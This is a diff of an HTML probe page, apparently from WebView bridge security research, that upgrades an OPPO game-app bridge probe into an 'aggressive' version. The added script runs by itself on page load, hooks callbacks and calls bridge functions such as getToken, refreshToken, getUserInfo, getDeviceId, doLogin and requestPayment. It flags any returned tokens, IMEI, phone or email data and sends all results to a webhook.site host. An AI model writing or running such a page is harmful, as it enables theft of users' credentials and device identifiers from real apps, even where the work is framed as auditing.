@@ -2,31 +2,34 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OPPO WebBridge Native Action Probe v10</title>
+  <title>OPPO V12 Aggressive Bridge Sink Probe</title>
   <style>
-    body { background:#000; color:#eee; font-family:sans-serif; padding:20px; }
-    button { display:block; width:100%; padding:14px; margin:10px 0; font-size:18px; font-weight:800; }
+    body { background:#000; color:#eee; font-family:sans-serif; padding:18px; }
+    button { display:block; width:100%; padding:15px; margin:10px 0; font-size:18px; font-weight:900; }
     pre { background:#eee; color:#111; padding:14px; white-space:pre-wrap; word-break:break-word; }
-    .warn { color:#ff4d6d; font-weight:bold; }
+    .hot { color:#ff3355; font-weight:900; }
   </style>
 </head>
 <body>
-<h1>OPPO WebBridge Native Action Probe v10</h1>
-<p class="warn">Researcher-owned device. This page tests non-destructive native actions only.</p>
+<h1>OPPO V12 Aggressive Bridge Sink Probe</h1>
+<p class="hot">撞 getToken / refreshToken / doLogin / requestPayment / copyText / openUrl / deviceId / userInfo。</p>
 
-<button onclick="probeReadonly()">1. Probe readonly bridge</button>
-<button onclick="tryToast()">2. Trigger makeToast marker</button>
-<button onclick="tryClipboard()">3. Trigger clipboardText(marker)</button>
-<button onclick="tryLoginFalse()">4. Trigger doStartLogin(false)</button>
-<button onclick="tryLoginTrue()">5. Trigger doStartLogin(true)</button>
-<button onclick="tryOpenWebView()">6. Trigger openWebView(attacker URL)</button>
-<button onclick="tryCallNativeApi()">7. Try callNativeApi known-safe types</button>
-
+<button onclick="runV12()">RUN V12 AGGRESSIVE PROBE</button>
+<button onclick="runPaymentOnly()">RUN requestPayment ONLY</button>
+<button onclick="runLoginOnly()">RUN doLogin ONLY</button>
+<button onclick="runCopyOnly()">RUN copyText ONLY</button>
 <pre id="out">WAITING</pre>
 
 <script>
-const WEBHOOK = "https://webhook.site/3947f7d3-968a-409a-9d5f-3bc7003d3df2";
-const MARKER = "OPPO_NATIVE_ACTION_MARKER_" + Date.now();
+const WEBHOOK = "https://webhook.site/c7f1b6a1-459e-4a70-8e5a-f0d96deee040";
+const VERSION = "v12_aggressive_bridge_sink_probe";
+const MARKER = "OPPO_V12_MARKER_" + Date.now();
+
+window.__OPPO_V12 = {
+  callbacks: [],
+  errors: [],
+  asyncEvents: []
+};
 
 function s(x) {
   try {
@@ -35,174 +38,439 @@ function s(x) {
     if (typeof x === "string") return x;
     if (typeof x === "number" || typeof x === "boolean") return String(x);
     return JSON.stringify(x);
-  } catch(e) {
-    try { return String(x); } catch(_) { return "[unstringifiable]"; }
+  } catch (e) {
+    try { return String(x); } catch (_) { return "[unstringifiable]"; }
   }
 }
 
-function call(method, args) {
-  const a = window.android;
-  const item = {
-    method,
-    args: args || [],
-    exists: false,
-    ok: false,
-    returnType: null,
-    rawReturnValue: null,
-    error: null
-  };
-
-  try {
-    if (!a || typeof a !== "object") {
-      item.error = "window.android missing";
-      return item;
-    }
-    item.exists = typeof a[method] === "function";
-    if (!item.exists) {
-      item.error = "missing_or_not_function";
-      return item;
-    }
-    const ret = a[method].apply(a, args || []);
-    item.ok = true;
-    item.returnType = typeof ret;
-    item.rawReturnValue = s(ret);
-  } catch(e) {
-    item.error = s(e && (e.stack || e.message || e));
-  }
-  return item;
+function preview(x, n=1800) {
+  const t = s(x);
+  return t.length <= n ? t : t.slice(0, n) + "...[+" + (t.length - n) + " chars]";
 }
 
-function payload(eventType, result) {
+function flags(raw) {
+  const x = s(raw).toLowerCase();
   return {
-    eventType,
-    version: "v10_native_action_probe",
-    ts: new Date().toISOString(),
-    marker: MARKER,
-    href: location.href,
-    ua: navigator.userAgent,
-    expectedContainer: "com.oplus.games",
-    androidBridge: describeAndroid(),
-    result
+    length: s(raw).length,
+    nonEmpty: s(raw) !== "" && s(raw) !== "undefined" && s(raw) !== "null",
+    token: x.includes("token"),
+    auth: x.includes("auth"),
+    sso: x.includes("sso"),
+    openid: x.includes("openid") || x.includes("open_id"),
+    ouid: x.includes("ouid"),
+    imei: x.includes("imei"),
+    oaid: x.includes("oaid"),
+    guid: x.includes("guid"),
+    user: x.includes("user") || x.includes("uid") || x.includes("username"),
+    phone: x.includes("phone"),
+    email: x.includes("email"),
+    pay: x.includes("pay") || x.includes("order") || x.includes("amount"),
+    login: x.includes("login")
   };
 }
 
-function describeAndroid() {
-  const a = window.android;
-  const out = {
-    exists: !!a,
-    type: typeof a,
-    tag: a ? Object.prototype.toString.call(a) : null,
-    ownKeys: [],
-    functionKeys: []
-  };
-  try {
-    if (a) {
-      out.ownKeys = Object.getOwnPropertyNames(a).slice(0, 120);
-      out.functionKeys = out.ownKeys.filter(k => {
-        try { return typeof a[k] === "function"; } catch(e) { return false; }
-      });
-    }
-  } catch(e) {
-    out.error = s(e);
+function hotFlags(f) {
+  return f && f.nonEmpty && (
+    f.token || f.auth || f.sso || f.openid || f.ouid || f.imei ||
+    f.oaid || f.guid || f.user || f.phone || f.email || f.pay || f.login
+  );
+}
+
+function installCallbackHooks() {
+  const names = [
+    "OPPO_V12_CB",
+    "__OPPO_V12_CB",
+    "IISCBridgeCallback",
+    "ISCBridgeCallback",
+    "OplusGameCallback",
+    "OplusGameBridgeCallback",
+    "GameEmpowerCallback",
+    "WebApiCallback",
+    "HeytapJsApiCallback",
+    "nativeCallback",
+    "jsBridgeCallback",
+    "onNativeCallback",
+    "onBridgeCallback"
+  ];
+
+  for (const name of names) {
+    window[name] = function() {
+      const args = Array.from(arguments).map(s);
+      const entry = { cb: name, ts: new Date().toISOString(), args, joined: args.join(" | "), flags: flags(args.join(" | ")) };
+      window.__OPPO_V12.callbacks.push(entry);
+      flush("CALLBACK_FIRED_" + name);
+      return true;
+    };
   }
-  return out;
+
+  window.HeytapJsApi = window.HeytapJsApi || {};
+  const oldHeytap = window.HeytapJsApi.callback;
+  window.HeytapJsApi.callback = function() {
+    const args = Array.from(arguments).map(s);
+    const entry = { cb: "HeytapJsApi.callback", ts: new Date().toISOString(), args, joined: args.join(" | "), flags: flags(args.join(" | ")) };
+    window.__OPPO_V12.callbacks.push(entry);
+    flush("CALLBACK_FIRED_HeytapJsApi");
+    try {
+      if (typeof oldHeytap === "function") return oldHeytap.apply(this, arguments);
+    } catch(e) {}
+  };
 }
 
-function send(p) {
-  const json = JSON.stringify(p);
-  document.getElementById("out").textContent = JSON.stringify(p, null, 2);
+installCallbackHooks();
+
+function getProps(obj) {
+  const out = new Set();
+  try { Object.getOwnPropertyNames(obj).forEach(k => out.add(k)); } catch(e) {}
+  try {
+    let p = Object.getPrototypeOf(obj);
+    let depth = 0;
+    while (p && depth++ < 4) {
+      Object.getOwnPropertyNames(p).forEach(k => out.add(k));
+      p = Object.getPrototypeOf(p);
+    }
+  } catch(e) {}
+  return Array.from(out);
+}
+
+function candidateNames() {
+  const names = new Set([
+    "android",
+    "__ISCbridge__",
+    "IISCBridgeView",
+    "IISCBridge",
+    "ISCBridgeView",
+    "ISCBridge",
+    "HeytapNativeApi",
+    "HeytapJsApi",
+    "OplusGameBridge",
+    "OplusGame",
+    "OplusBridge",
+    "OPLUSBridge",
+    "GameEmpowerBridge",
+    "GameEmpower",
+    "GameCenterBridge",
+    "WebApiSdk",
+    "WebApi",
+    "NativeApi",
+    "NativeBridge",
+    "JSBridge",
+    "JsBridge",
+    "bridge",
+    "oplus",
+    "oppo",
+    "account",
+    "user",
+    "pay",
+    "client",
+    "android_feedback",
+    "OppoPaySdk",
+    "XunYouBridge",
+    "PrivacyAgreement"
+  ]);
 
   try {
-    navigator.sendBeacon(WEBHOOK + "/oppo-v10-native-action-beacon",
-      new Blob([json], { type: "text/plain" }));
+    Object.getOwnPropertyNames(window).forEach(name => {
+      if (/(android|bridge|jsapi|native|oppo|oplus|heytap|isc|iisc|game|pay|user|account|login|token|sso|open|empower|webapi|sdk|client|callback)/i.test(name)) {
+        names.add(name);
+      }
+    });
   } catch(e) {}
 
   try {
-    fetch(WEBHOOK + "/oppo-v10-native-action-post", {
-      method: "POST",
-      mode: "no-cors",
-      headers: { "content-type": "text/plain" },
-      body: json
+    Object.getOwnPropertyNames(window).forEach(name => {
+      let obj;
+      try { obj = window[name]; } catch(e) { return; }
+      if (!obj) return;
+      const t = typeof obj;
+      if (t !== "object" && t !== "function") return;
+      let keys = [];
+      try { keys = getProps(obj); } catch(e) {}
+      if (keys.some(k => /(token|sso|openid|user|account|login|pay|device|imei|oaid|copy|payment|refresh|bridge|native|invoke|call|post|sync|async)/i.test(k))) {
+        names.add(name);
+      }
+    });
+  } catch(e) {}
+
+  return Array.from(names).slice(0, 280);
+}
+
+function descObj(name) {
+  let obj;
+  try { obj = window[name]; } catch(e) { return { name, accessError: s(e) }; }
+  if (!obj) return { name, exists:false, type: typeof obj };
+
+  let keys = [];
+  let fns = [];
+  try {
+    keys = getProps(obj).slice(0, 300);
+    fns = keys.filter(k => {
+      try { return typeof obj[k] === "function"; } catch(e) { return false; }
+    });
+  } catch(e) {}
+
+  return {
+    name,
+    exists: true,
+    type: typeof obj,
+    tag: Object.prototype.toString.call(obj),
+    keys,
+    functionKeys: fns,
+    highValueFunctionKeys: fns.filter(k => /(token|sso|openid|user|account|login|pay|device|imei|oaid|copy|payment|refresh|auth)/i.test(k))
+  };
+}
+
+const COMMON_PAYLOADS = {
+  getToken: { type:"getToken", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  refreshToken: { type:"refreshToken", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  isLogin: { type:"isLogin", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  getDeviceId: { type:"getDeviceId", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  getDeviceInfo: { type:"getDeviceInfo", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  getUserInfo: { type:"getUserInfo", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  getAccountInfo: { type:"getAccountInfo", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  doLogin: { type:"doLogin", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  copyText: { type:"copyText", text:MARKER, tip:"OPPO V12 copied", callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  openUrl: { type:"openUrl", url:"https://echowarden-y.github.io/oppo-webbridge-probe/?v12_openurl_marker=" + encodeURIComponent(MARKER), callback:"OPPO_V12_CB", callbackId:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+  requestPayment: {
+    type:"requestPayment",
+    callback:"OPPO_V12_CB",
+    callbackId:"OPPO_V12_CB",
+    msgId:"OPPO_V12_CB",
+    payInfo:{
+      mAmount:0,
+      mProductName:"OPPO_AUDIT_NO_REAL_PAYMENT",
+      mProductDesc:"OPPO_AUDIT_NO_REAL_PAYMENT",
+      mOrder:"AUDIT_" + MARKER,
+      mPartnerOrder:"AUDIT_" + MARKER,
+      mPackageName:"com.audit.gamesrouterparam",
+      mNotifyUrl:"https://example.invalid/oppo-audit",
+      mToken:"AUDIT_INVALID_TOKEN",
+      mSign:"AUDIT_INVALID_SIGN",
+      mCurrencyCode:"CNY",
+      mCount:1
+    }
+  }
+};
+
+const API_NAMES = [
+  "getToken",
+  "refreshToken",
+  "isLogin",
+  "getDeviceId",
+  "getDeviceInfo",
+  "getUserInfo",
+  "getAccountInfo",
+  "doLogin",
+  "copyText",
+  "openUrl",
+  "requestPayment"
+];
+
+function record(results, objectName, pattern, method, args, ret, err) {
+  const raw = err ? s(err && (err.stack || err.message || err)) : s(ret);
+  const f = flags(raw);
+  results.push({
+    object: objectName,
+    pattern,
+    method,
+    argsPreview: args.map(x => preview(x, 700)),
+    ok: !err,
+    returnType: err ? null : typeof ret,
+    rawReturnValue: raw,
+    preview: preview(raw, 1800),
+    flags: f,
+    hot: hotFlags(f)
+  });
+}
+
+function tryCall(results, objectName, obj, pattern, method, args) {
+  try {
+    let ret;
+    if (pattern === "direct") ret = obj[method].apply(obj, args);
+    else if (pattern === "call") ret = obj.call.apply(obj, args);
+    else if (pattern === "invoke") ret = obj.invoke.apply(obj, args);
+    else if (pattern === "postMessage") ret = obj.postMessage.apply(obj, args);
+    else if (pattern === "send") ret = obj.send.apply(obj, args);
+    else if (pattern === "request") ret = obj.request.apply(obj, args);
+    else if (pattern === "callNativeApi") ret = obj.callNativeApi.apply(obj, args);
+    else if (pattern === "callAsyncNativeApi") ret = obj.callAsyncNativeApi.apply(obj, args);
+    record(results, objectName, pattern, method, args, ret, null);
+  } catch(e) {
+    record(results, objectName, pattern, method, args, null, e);
+  }
+}
+
+function aggressiveObjectProbe(objectName, mode) {
+  const results = [];
+  let obj;
+  try { obj = window[objectName]; } catch(e) {
+    return [{ object:objectName, accessError:s(e) }];
+  }
+  if (!obj) return [];
+
+  const props = getProps(obj);
+  const functions = props.filter(k => {
+    try { return typeof obj[k] === "function"; } catch(e) { return false; }
+  });
+
+  const targetApis = mode === "payment" ? ["requestPayment"] :
+                     mode === "login" ? ["doLogin", "isLogin", "getToken", "refreshToken"] :
+                     mode === "copy" ? ["copyText"] :
+                     API_NAMES;
+
+  // 1. 直接同名方法：obj.getToken(), obj.getToken(json), obj.getToken(json, cb)
+  for (const api of targetApis) {
+    if (functions.includes(api)) {
+      const p = COMMON_PAYLOADS[api] || { type:api, callback:"OPPO_V12_CB", msgId:"OPPO_V12_CB" };
+      const json = JSON.stringify(p);
+
+      tryCall(results, objectName, obj, "direct", api, []);
+      tryCall(results, objectName, obj, "direct", api, [json]);
+      tryCall(results, objectName, obj, "direct", api, [json, "OPPO_V12_CB"]);
+      tryCall(results, objectName, obj, "direct", api, [p]);
+      tryCall(results, objectName, obj, "direct", api, [p, "OPPO_V12_CB"]);
+
+      if (api === "copyText") {
+        tryCall(results, objectName, obj, "direct", api, [MARKER]);
+        tryCall(results, objectName, obj, "direct", api, [MARKER, "OPPO V12 copied"]);
+      }
+      if (api === "openUrl") {
+        const u = "https://echowarden-y.github.io/oppo-webbridge-probe/?v12_openurl_marker=" + encodeURIComponent(MARKER);
+        tryCall(results, objectName, obj, "direct", api, [u]);
+        tryCall(results, objectName, obj, "direct", api, [u, "OPPO V12"]);
+      }
+    }
+  }
+
+  // 2. 通用调度器：call/invoke/postMessage/request/send
+  const dispatcherNames = ["call", "invoke", "postMessage", "send", "request"];
+  for (const disp of dispatcherNames) {
+    if (!functions.includes(disp)) continue;
+
+    for (const api of targetApis) {
+      const p = COMMON_PAYLOADS[api] || { type:api, callback:"OPPO_V12_CB", msgId:"OPPO_V12_CB" };
+      const json = JSON.stringify(p);
+
+      tryCall(results, objectName, obj, disp, disp, [api]);
+      tryCall(results, objectName, obj, disp, disp, [api, json]);
+      tryCall(results, objectName, obj, disp, disp, [api, json, "OPPO_V12_CB"]);
+      tryCall(results, objectName, obj, disp, disp, [json]);
+      tryCall(results, objectName, obj, disp, disp, [p]);
+      tryCall(results, objectName, obj, disp, disp, [{ method:api, params:p, callback:"OPPO_V12_CB", msgId:"OPPO_V12_CB" }]);
+      tryCall(results, objectName, obj, disp, disp, [JSON.stringify({ method:api, params:p, callback:"OPPO_V12_CB", msgId:"OPPO_V12_CB" })]);
+    }
+  }
+
+  // 3. Android/WebPlus/Heytap 通道：callNativeApi/callAsyncNativeApi
+  for (const disp of ["callNativeApi", "callAsyncNativeApi"]) {
+    if (!functions.includes(disp)) continue;
+
+    for (const api of targetApis) {
+      const p = COMMON_PAYLOADS[api] || { type:api, callback:"OPPO_V12_CB", msgId:"OPPO_V12_CB" };
+      const variants = [
+        { type: api, callback:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+        { api: api, callback:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+        { method: api, callback:"OPPO_V12_CB", msgId:"OPPO_V12_CB" },
+        p
+      ];
+
+      for (const v of variants) {
+        tryCall(results, objectName, obj, disp, disp, [JSON.stringify(v)]);
+        tryCall(results, objectName, obj, disp, disp, [JSON.stringify(v), "OPPO_V12_CB"]);
+      }
+    }
+  }
+
+  return results;
+}
+
+function build(mode) {
+  const names = candidateNames();
+  const objects = names.map(descObj);
+  const calls = [];
+  for (const name of names) {
+    calls.push(...aggressiveObjectProbe(name, mode || "all"));
+  }
+
+  const hot = [];
+  for (const r of calls) {
+    if (r && r.hot) hot.push(r);
+  }
+
+  return {
+    eventType: "OPPO_V12_AGGRESSIVE_BRIDGE_SINK_RESULT",
+    version: VERSION,
+    mode: mode || "all",
+    ts: new Date().toISOString(),
+    marker: MARKER,
+    href: location.href,
+    origin: location.origin,
+    ua: navigator.userAgent,
+    candidateNames: names,
+    objects,
+    callCount: calls.length,
+    hotCount: hot.length,
+    hotResults: hot,
+    callbacks: window.__OPPO_V12.callbacks,
+    errors: window.__OPPO_V12.errors,
+    calls
+  };
+}
+
+function send(payload) {
+  const json = JSON.stringify(payload);
+  document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
+
+  try {
+    navigator.sendBeacon(WEBHOOK + "/oppo-v12-aggressive-beacon", new Blob([json], { type:"text/plain" }));
+  } catch(e) {}
+
+  try {
+    fetch(WEBHOOK + "/oppo-v12-aggressive-post", {
+      method:"POST",
+      mode:"no-cors",
+      headers:{ "content-type":"text/plain" },
+      body:json
     }).catch(function(){});
   } catch(e) {}
 
   try {
     new Image().src =
-      WEBHOOK + "/oppo-v10-native-action-get?event=" +
-      encodeURIComponent(p.eventType) +
+      WEBHOOK +
+      "/oppo-v12-aggressive-get?event=" +
+      encodeURIComponent(payload.eventType) +
+      "&mode=" + encodeURIComponent(payload.mode) +
       "&t=" + Date.now() +
       "&d=" + encodeURIComponent(json).slice(0, 7600);
   } catch(e) {}
 }
 
-function probeReadonly() {
-  const methods = [
-    "getPackageName",
-    "getDeviceModel",
-    "getNetworkType",
-    "getRomVersion",
-    "getRomVersionCode",
-    "getImei",
-    "getOpenId",
-    "getLoginInfo",
-    "isLogin"
-  ];
-  send(payload("OPPO_V10_READONLY_PROBE", methods.map(m => call(m, []))));
+function flush(reason) {
+  const p = build("callback_flush");
+  p.flushReason = reason;
+  send(p);
 }
 
-function tryToast() {
-  send(payload("OPPO_V10_MAKETOAST_ATTEMPT", [
-    call("makeToast", [MARKER]),
-    call("makeToast", ["Native bridge invoked from attacker-controlled web content"])
-  ]));
-}
+window.runV12 = function() {
+  send(build("all"));
+  setTimeout(() => send(build("all_after_3s")), 3000);
+};
 
-function tryClipboard() {
-  send(payload("OPPO_V10_CLIPBOARD_ATTEMPT", [
-    call("clipboardText", [MARKER]),
-    call("clipboardText", ["Copied by com.oplus.games WebBridge: " + MARKER])
-  ]));
-}
+window.runPaymentOnly = function() {
+  send(build("payment"));
+  setTimeout(() => send(build("payment_after_3s")), 3000);
+};
 
-function tryLoginFalse() {
-  send(payload("OPPO_V10_DOSTARTLOGIN_FALSE_ATTEMPT", [
-    call("doStartLogin", [false])
-  ]));
-}
+window.runLoginOnly = function() {
+  send(build("login"));
+  setTimeout(() => send(build("login_after_3s")), 3000);
+};
 
-function tryLoginTrue() {
-  send(payload("OPPO_V10_DOSTARTLOGIN_TRUE_ATTEMPT", [
-    call("doStartLogin", [true])
-  ]));
-}
+window.runCopyOnly = function() {
+  send(build("copy"));
+  setTimeout(() => send(build("copy_after_3s")), 3000);
+};
 
-function tryOpenWebView() {
-  const url = "https://echowarden-y.github.io/oppo-webbridge-probe/?check=v10_openwebview_landing&marker=" + encodeURIComponent(MARKER) + "&cb=" + Date.now();
-  send(payload("OPPO_V10_OPENWEBVIEW_ATTEMPT", [
-    call("openWebView", [url, "OPPO audit marker", "{}"]),
-    call("openWebView", [url, "OPPO audit marker", ""])
-  ]));
-}
-
-function tryCallNativeApi() {
-  const candidates = [
-    { type: "isNightMode" },
-    { type: "getLoginInfo" },
-    { type: "getOpenId" },
-    { type: "isLogin" },
-    { type: "getUserInfo" },
-    { type: "getToken" },
-    { type: "getDeviceInfo" },
-    { type: "getNetworkType" }
-  ];
-  const results = [];
-  for (const c of candidates) {
-    results.push(call("callNativeApi", [JSON.stringify(c)]));
-  }
-  send(payload("OPPO_V10_CALLNATIVEAPI_ATTEMPT", results));
-}
-
-setTimeout(probeReadonly, 1000);
+setTimeout(window.runV12, 1200);
 </script>
 </body>
 </html>
